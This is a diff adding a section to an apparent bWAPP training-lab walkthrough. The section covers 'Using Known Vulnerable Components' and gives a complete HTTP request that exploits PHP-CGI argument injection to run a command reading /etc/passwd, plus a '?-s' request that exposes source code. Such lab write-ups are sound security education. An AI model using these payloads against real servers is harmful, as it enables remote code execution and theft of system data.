@@ -470,3 +470,25 @@ Please references [csrf_2.html](resources/csrf_2.html).  Again, replace the addr
 ### Cross-Site Request Forgery (Transfer Amount)
 Please references [csrf_3.html](resources/csrf_3.html).  Again, replace the address within the HTML with your own bWAPP server to change the secret.
 
+# A9 - Using Known Vulnerable Components
+
+### PHP CGI Remote Code Execution
+```
+POST /bWAPP/admin/phpinfo.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
+Host: 192.168.1.20
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Length: 70
+Cookie: security_level=0; PHPSESSID=e27e4148fbb0b82028e1cd6e159f4e7a
+Connection: close
+
+<?php $r; exec('cat /etc/passwd', $r); echo implode($r, "\n"); die; ?>
+```
+
+There is also possibility to display source code
+```
+http://192.168.1.20/bWAPP/admin/phpinfo.php?-s
+```
+
